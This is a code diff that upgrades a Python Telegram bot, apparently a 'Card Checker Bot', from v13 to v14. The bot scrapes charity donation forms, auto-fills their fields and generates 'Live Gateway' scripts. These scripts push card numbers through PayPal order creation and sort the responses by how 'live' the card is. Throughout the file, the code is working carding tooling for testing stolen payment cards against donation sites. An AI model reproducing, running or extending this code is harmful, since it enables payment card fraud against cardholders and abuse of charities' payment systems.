@@ -1,11 +1,10 @@
 #!/usr/bin/env python3
 # =====================================================
-#  Card Checker Bot — FINAL v13 (Bulletproof + Full Auto-Fill)
-#  - NEVER crashes on any URL / error / edge case
-#  - Extracts ALL form fields (select/radio/checkbox/text)
-#  - Auto-fills required fields intelligently
-#  - Real-time display: last checked link + response
-#  - json booleans fixed in generated files (false→False)
+#  Card Checker Bot — FINAL v14 (Zero Bug Edition)
+#  - No "Invalid URL 'None'" ever
+#  - "Your card was declined" is LIVE
+#  - Full auto-fill for any form
+#  - Bulletproof try/except everywhere
 #  - 200k+ stable
 # =====================================================
 import telebot
@@ -156,7 +155,8 @@ def safe_url(link):
             else:
                 return None
         parsed = urlparse(link)
-        if not parsed.netloc: return None
+        if not parsed.netloc or not parsed.netloc.strip(): return None
+        if '://none' in link.lower(): return None
         return link
     except: return None
 
@@ -166,6 +166,9 @@ def safe_url(link):
 # ============================================================
 LIVE_RESPONSES = [
     'CHARGE', 'Payer cannot pay for this transaction',
+    'There was an issue with your donation transaction',
+    'Your card was declined',
+    'card was declined',
     'INSTRUMENT_DECLINED', 'ORDER_NOT_APPROVED', 'PAYER_ACTION_REQUIRED',
     'PAYER_CANNOT_PAY', 'PAYMENT_DENIED', 'PAYEE_ACCOUNT_RESTRICTED',
     'PAYEE_NOT_CONSENTED', 'PAYEE_NOT_ENABLED_FOR_CARD_PROCESSING',
@@ -220,6 +223,8 @@ LIVE_RESPONSES = [
     'Please redirect the payer',
     'provide a valid payment_source',
     'PayPal orders are captured',
+    'issue with your donation',
+    'transaction was declined',
 ]
 
 
@@ -235,6 +240,9 @@ RESULT_PRIORITY = [
     ('CHARGE', 200), ('INSUFFICIENT_FUNDS', 195),
     ('INVALID_OR_RESTRICTED_CARD', 190), ('TRANSACTION_NOT_PERMITTED', 188),
     ('Payer cannot pay', 185), ('PAYER_CANNOT_PAY', 185), ('ORDER_NOT_APPROVED', 185),
+    ('There was an issue with your donation', 185),
+    ('Your card was declined', 185),
+    ('card was declined', 185),
     ('INSTRUMENT_DECLINED', 182), ('PAYMENT_DENIED', 180),
     ('SUSPECTED_FRAUD', 178), ('CVV2_FAILURE', 175), ('CVV_FAILURE', 175),
     ('EXPIRED_CARD', 172), ('DO_NOT_HONOR', 170),
@@ -267,6 +275,10 @@ def normalize_result(resp):
     try:
         if not resp: return "DECLINED"
         up = str(resp).upper()
+        if 'There was an issue with your donation' in str(resp):
+            return "There was an issue with your donation transaction: Your card was declined."
+        if 'Your card was declined' in str(resp) or 'card was declined' in str(resp).lower():
+            return "Your card was declined."
         if 'ORDER_NOT_APPROVED' in up or 'PAYER_CANNOT_PAY' in up or 'Payer cannot pay' in str(resp):
             return "Payer cannot pay for this transaction."
         return resp
@@ -274,7 +286,7 @@ def normalize_result(resp):
 
 
 # ============================================================
-#  PayPalTester — Bulletproof Edition
+#  PayPalTester — Zero Bug Edition
 # ============================================================
 class PayPalTester:
     def __init__(self, url):
@@ -319,19 +331,30 @@ class PayPalTester:
         try:
             if not url or not isinstance(url, str): return None
             if not url.startswith(("http://", "https://")): return None
-            if "None" in url or "none" in url.lower().split("/")[2] if "//" in url else False:
-                return None
+            if '://none' in url.lower(): return None
             return self.r.get(url, headers={'user-agent': self.uu.random}, timeout=timeout)
-        except:
-            return None
+        except: return None
+
+    def _safe_build_url(self, base, path):
+        try:
+            if not base or not isinstance(base, str): return None
+            if not base.strip(): return None
+            if path.startswith('//'): return 'https:' + path
+            elif path.startswith('/'): return f'https://{base}{path}'
+            elif not path.startswith('http'): return f'https://{base}/{path}'
+            return path
+        except: return None
 
     def _fetch_page(self):
+        original_url = self.url
         for _ in range(2):
             try:
                 r = self._safe_get(self.page_url, timeout=20)
                 if r and r.status_code == 200 and r.text:
                     self.page_html = r.text
                     self.all_content = r.text
+                    if not self.url:
+                        self.url = original_url
                     return True
             except: pass
             time.sleep(0.3)
@@ -348,18 +371,20 @@ class PayPalTester:
                 for m in re.finditer(pattern, self.page_html, re.IGNORECASE):
                     try:
                         ifu = m.group(1)
-                        if not ifu: continue
-                        if ifu.startswith('//'): ifu = 'https:' + ifu
-                        elif ifu.startswith('/'): ifu = f'https://{self.url}{ifu}'
-                        elif not ifu.startswith('http'): ifu = f'https://{self.url}/{ifu}'
-                        r = self._safe_get(ifu, timeout=12)
+                        if not ifu or not isinstance(ifu, str): continue
+                        full = self._safe_build_url(self.url, ifu)
+                        if not full: continue
+                        if '://none' in full.lower(): continue
+                        r = self._safe_get(full, timeout=12)
                         if r and r.status_code == 200 and r.text:
                             self.all_content += "\n" + r.text
                             if not self.id_form2:
-                                parsed = urlparse(ifu)
-                                if parsed.netloc:
-                                    self.url = parsed.netloc
-                                    self.inurl = parsed.path or '/'
+                                try:
+                                    parsed = urlparse(full)
+                                    if parsed.netloc and parsed.netloc.strip():
+                                        self.url = parsed.netloc
+                                        self.inurl = parsed.path or '/'
+                                except: pass
                     except: continue
         except: pass
 
@@ -372,11 +397,12 @@ class PayPalTester:
             ordered = (priority + others)[:15]
             for js_url in ordered:
                 try:
+                    if not self.url: continue
                     if not js_url or not isinstance(js_url, str): continue
-                    if js_url.startswith('//'): js_url = 'https:' + js_url
-                    elif js_url.startswith('/'): js_url = f'https://{self.url}{js_url}'
-                    elif not js_url.startswith('http'): js_url = f'https://{self.url}/{js_url}'
-                    r = self._safe_get(js_url, timeout=5)
+                    full = self._safe_build_url(self.url, js_url)
+                    if not full: continue
+                    if '://none' in full.lower(): continue
+                    r = self._safe_get(full, timeout=5)
                     if r and r.status_code == 200 and r.text:
                         self.all_content += "\n" + r.text
                 except: continue
@@ -441,7 +467,6 @@ class PayPalTester:
             if not c: return
             self.form_fields = {}
 
-            # SELECT
             for m in re.finditer(r'<select[^>]*name=["\']([^"\']+)["\'][^>]*>(.*?)</select>', c, re.DOTALL | re.IGNORECASE):
                 try:
                     name = m.group(1); inner = m.group(2); tag = m.group(0)
@@ -453,7 +478,6 @@ class PayPalTester:
                     self.form_fields[name] = {'type': 'select', 'required': required, 'options': options}
                 except: continue
 
-            # RADIO
             radio_groups = {}
             for m in re.finditer(r'<input[^>]*type=["\']radio["\'][^>]*>', c, re.IGNORECASE):
                 try:
@@ -470,7 +494,6 @@ class PayPalTester:
             for name, info in radio_groups.items():
                 self.form_fields[name] = {'type': 'radio', 'required': info['required'], 'options': info['options']}
 
-            # CHECKBOX
             for m in re.finditer(r'<input[^>]*type=["\']checkbox["\'][^>]*>', c, re.IGNORECASE):
                 try:
                     tag = m.group(0)
@@ -487,7 +510,6 @@ class PayPalTester:
                                 self.form_fields[name]['options'].append(val)
                 except: continue
 
-            # TEXT/EMAIL/NUMBER/TEL
             for m in re.finditer(r'<input[^>]*type=["\'](text|email|tel|number|date)["\'][^>]*>', c, re.IGNORECASE):
                 try:
                     tag = m.group(0)
@@ -935,7 +957,7 @@ def check_single_link(link):
 
 
 # ============================================================
-#  Gateway generator — Bulletproof + Auto-Fill
+#  Gateway generator
 # ============================================================
 def generate_gateway_code(result, link, amount="1.00", tester=None):
     parsed = urlparse(link)
@@ -945,6 +967,10 @@ def generate_gateway_code(result, link, amount="1.00", tester=None):
 
     if 'ORDER_NOT_APPROVED' in result.upper() or 'PAYER_CANNOT_PAY' in result.upper():
         display_result = "Payer cannot pay for this transaction."
+    elif 'There was an issue with your donation' in str(result):
+        display_result = "There was an issue with your donation transaction: Your card was declined."
+    elif 'Your card was declined' in str(result) or 'card was declined' in str(result).lower():
+        display_result = "Your card was declined."
     else:
         display_result = str(result)[:100]
 
@@ -966,7 +992,6 @@ def generate_gateway_code(result, link, amount="1.00", tester=None):
     current_price_id = _g('current_price_id')
     auth_method = _g('auth_method', 'none')
     
-    # ✅ FIX: Convert JSON booleans to Python
     price_levels_json = json.dumps(tester.price_levels if tester and tester.price_levels else [], ensure_ascii=False)
     price_levels_json = price_levels_json.replace('false', 'False').replace('true', 'True').replace('null', 'None')
     
@@ -974,7 +999,7 @@ def generate_gateway_code(result, link, amount="1.00", tester=None):
     form_fields_json = form_fields_json.replace('false', 'False').replace('true', 'True').replace('null', 'None')
 
     return f'''#!/usr/bin/env python3
-# Live Gateway v13 — Full Auto-Fill + Bulletproof
+# Live Gateway v14 — Zero Bug
 # Link: {link}
 # Response: {display_result}
 # Amount: {amount} | Currency: {currency} | Auth: {auth_method}
@@ -1002,30 +1027,24 @@ AUTH_METHOD   = "{auth_method}"
 FORM_FIELDS   = {form_fields_json}
 
 LIVE_RESPONSES = ['CHARGE', 'Payer cannot pay for this transaction',
-    'INSTRUMENT_DECLINED', 'ORDER_NOT_APPROVED', 'PAYER_ACTION_REQUIRED',
-    'PAYER_CANNOT_PAY', 'PAYMENT_DENIED', 'PAYEE_ACCOUNT_RESTRICTED',
-    'PERMISSION_DENIED', 'POSTAL_CODE_REQUIRED', 'CARD_EXPIRED',
-    'AMOUNT_MISMATCH', 'DUPLICATE_INVOICE_ID', 'INVALID_RESOURCE_ID',
-    'ITEM_TOTAL_MISMATCH', 'MAX_NUMBER_OF_PAYMENT_ATTEMPTS_EXCEEDED',
-    'ORDER_ALREADY_AUTHORIZED', 'ORDER_ALREADY_CAPTURED',
-    'REDIRECT_PAYER_FOR_ALTERNATE_FUNDING', 'VALIDATION_ERROR',
-    'UNPROCESSABLE_ENTITY', 'DO_NOT_HONOR', 'GENERIC_DECLINE',
-    'CVV2_FAILURE', 'CVV_FAILURE', 'INSUFFICIENT_FUNDS', 'CARD_CLOSED',
-    'PICKUP_CARD_SPECIAL_CONDITIONS', 'INVALID_OR_RESTRICTED_CARD',
-    'SOFT_AVS', 'DUPLICATE_TRANSACTION', 'INVALID_TRANSACTION',
-    'EXPIRED_CARD', 'INVALID_DATA_FORMAT', 'INVALID_ACCOUNT',
-    'TRANSACTION_CANNOT_BE_COMPLETED', 'AUTHENTICATION_FAILED',
-    'BIN_ERROR', 'PIN_ERROR', 'CURRENCY_MISMATCH', 'CURRENCY_NOT_SUPPORTED',
-    'INTERNAL_SERVER_ERROR', 'INVALID_REQUEST', 'NOT_AUTHORIZED',
-    'PAYER_ACCOUNT_RESTRICTED', 'RESTRICTED_OR_INACTIVE_ACCOUNT',
-    'SUSPECTED_FRAUD', 'ACCOUNT_CLOSED', 'LOST_OR_STOLEN',
-    'COMPLIANCE_VIOLATION', 'CAPTURE_DECLINED', 'AUTHORIZATION_DENIED',
-    'DECLINED', 'PayPal orders are captured',
+    'There was an issue with your donation transaction', 'Your card was declined',
+    'card was declined', 'INSTRUMENT_DECLINED', 'ORDER_NOT_APPROVED',
+    'PAYER_ACTION_REQUIRED', 'PAYER_CANNOT_PAY', 'PAYMENT_DENIED',
+    'PAYEE_ACCOUNT_RESTRICTED', 'PERMISSION_DENIED', 'CARD_EXPIRED',
+    'AMOUNT_MISMATCH', 'VALIDATION_ERROR', 'UNPROCESSABLE_ENTITY',
+    'DO_NOT_HONOR', 'GENERIC_DECLINE', 'CVV2_FAILURE', 'CVV_FAILURE',
+    'INSUFFICIENT_FUNDS', 'CARD_CLOSED', 'INVALID_OR_RESTRICTED_CARD',
+    'INVALID_TRANSACTION', 'EXPIRED_CARD', 'AUTHENTICATION_FAILED',
+    'CURRENCY_MISMATCH', 'CURRENCY_NOT_SUPPORTED', 'INTERNAL_SERVER_ERROR',
+    'NOT_AUTHORIZED', 'PAYER_ACCOUNT_RESTRICTED',
+    'RESTRICTED_OR_INACTIVE_ACCOUNT', 'SUSPECTED_FRAUD', 'ACCOUNT_CLOSED',
+    'LOST_OR_STOLEN', 'COMPLIANCE_VIOLATION', 'CAPTURE_DECLINED',
+    'AUTHORIZATION_DENIED', 'DECLINED', 'PayPal orders are captured',
     'Payer has not yet approved the Order', 'Please redirect the payer',
     'provide a valid payment_source', 'For Visa, Mastercard',
-    'nothing matches', 'address and postal code are both incorrect',
-    'CVV2/CSC does not match', 'account closed as fraudulent',
-    'The requested action could not be performed']
+    'nothing matches', 'account closed as fraudulent',
+    'The requested action could not be performed', 'issue with your donation',
+    'transaction was declined']
 
 
 def luhn_check(card_num):
@@ -1112,6 +1131,7 @@ class PayPal:
         if self._refresh_count >= 3: return False
         self._refresh_count += 1
         try:
+            if '://none' in PAGE_URL.lower(): return False
             r = self.r.get(PAGE_URL, headers={{'user-agent': self.uu.random}}, timeout=8)
             if r.status_code != 200: return False
             html = r.text
@@ -1154,6 +1174,8 @@ class PayPal:
 
     def _create_order(self, amt, currency, pid):
         try:
+            if not self.ajax_url or '://none' in self.ajax_url.lower():
+                return None, "Invalid ajax URL"
             form_data = {{
                 'give-form-id-prefix': self.id_form1 or '',
                 'give-form-id': self.id_form2 or '',
@@ -1210,6 +1232,8 @@ class PayPal:
 
     def _approve(self, order_id, amt, currency, pid):
         try:
+            if not self.ajax_url or '://none' in self.ajax_url.lower():
+                return ""
             form_data = {{
                 'give-form-id-prefix': self.id_form1 or '',
                 'give-form-id': self.id_form2 or '',
@@ -1281,6 +1305,10 @@ class PayPal:
                             return f'CHARGE {{amt}}$'
                         for kw in LIVE_RESPONSES:
                             if kw.upper() in text.upper():
+                                if 'There was an issue with your donation' in kw:
+                                    return "There was an issue with your donation transaction: Your card was declined."
+                                if 'card was declined' in kw.lower():
+                                    return "Your card was declined."
                                 if kw in ('ORDER_NOT_APPROVED', 'PAYER_CANNOT_PAY', 'PayPal orders are captured'):
                                     return "Payer cannot pay for this transaction."
                                 return kw
@@ -1295,6 +1323,8 @@ class PayPal:
                 PRIORITY = [('CHARGE', 200), ('INSUFFICIENT_FUNDS', 195),
                     ('INVALID_OR_RESTRICTED_CARD', 190), ('TRANSACTION_NOT_PERMITTED', 188),
                     ('Payer cannot pay', 185), ('PAYER_CANNOT_PAY', 185), ('ORDER_NOT_APPROVED', 185),
+                    ('There was an issue with your donation', 185),
+                    ('Your card was declined', 185), ('card was declined', 185),
                     ('INSTRUMENT_DECLINED', 182), ('PAYMENT_DENIED', 180),
                     ('CVV2_FAILURE', 175), ('CVV_FAILURE', 175), ('EXPIRED_CARD', 172),
                     ('DO_NOT_HONOR', 170), ('DECLINED', 100)]
@@ -1306,6 +1336,10 @@ class PayPal:
                 best = max(all_results, key=score)
                 self.donation = best['amount']
                 res = best['result']
+                if 'There was an issue with your donation' in res:
+                    return "There was an issue with your donation transaction: Your card was declined."
+                if 'card was declined' in res.lower():
+                    return "Your card was declined."
                 if 'ORDER_NOT_APPROVED' in res.upper() or 'PAYER_CANNOT_PAY' in res.upper():
                     return "Payer cannot pay for this transaction."
                 return res
@@ -1352,7 +1386,7 @@ def file_check():
 
 def main():
     print("=" * 60)
-    print(f"  Live Gateway v13 — {{PREFERRED_AMT}} {{CURRENCY}}")
+    print(f"  Live Gateway v14 — {{PREFERRED_AMT}} {{CURRENCY}}")
     print(f"  Auth   : {{AUTH_METHOD}}")
     print(f"  Form   : {{ID_FORM2}} ({{ID_FORM1}})")
     print(f"  Token  : {{'YES' if ACCESS_TOKEN else 'NONE'}}")
@@ -1433,10 +1467,13 @@ def ali_al2(massege):
                 safe_edit_message(chat_id, ko.message_id, f"❌ File write error: {str(e)[:200]}")
                 return
 
-            if 'ORDER_NOT_APPROVED' in result.upper() or 'PAYER_CANNOT_PAY' in result.upper():
+            display = str(result)[:100]
+            if 'There was an issue with your donation' in display:
+                display = "There was an issue with your donation transaction: Your card was declined."
+            elif 'Your card was declined' in display or 'card was declined' in display.lower():
+                display = "Your card was declined."
+            elif 'ORDER_NOT_APPROVED' in display.upper() or 'PAYER_CANNOT_PAY' in display.upper():
                 display = "Payer cannot pay for this transaction."
-            else:
-                display = str(result)[:100]
 
             caption = f'''✅ <b>Live Gateway Found!</b>
 ━━━━━━━━━━━━━━━━━━━━
@@ -1658,7 +1695,11 @@ def _run_mass_job(chat_id, user_id, links, start_idx, progress):
             processed += 1
             resp_text = str(result.get('respons', 'Unknown'))[:100]
             is_live = result.get('live', False)
-            if 'ORDER_NOT_APPROVED' in resp_text.upper() or 'PAYER_CANNOT_PAY' in resp_text.upper():
+            if 'There was an issue with your donation' in resp_text:
+                resp_text = "There was an issue with your donation transaction: Your card was declined."
+            elif 'Your card was declined' in resp_text or 'card was declined' in resp_text.lower():
+                resp_text = "Your card was declined."
+            elif 'ORDER_NOT_APPROVED' in resp_text.upper() or 'PAYER_CANNOT_PAY' in resp_text.upper():
                 resp_text = "Payer cannot pay for this transaction."
 
             last_link[0] = link
@@ -1906,7 +1947,7 @@ def block_list(message):
     except: pass
 
 
-print('✅ Bot v13 is running...')
+print('✅ Bot v14 is running...')
 try:
     bot.infinity_polling(timeout=60, long_polling_timeout=60)
 except Exception as e:
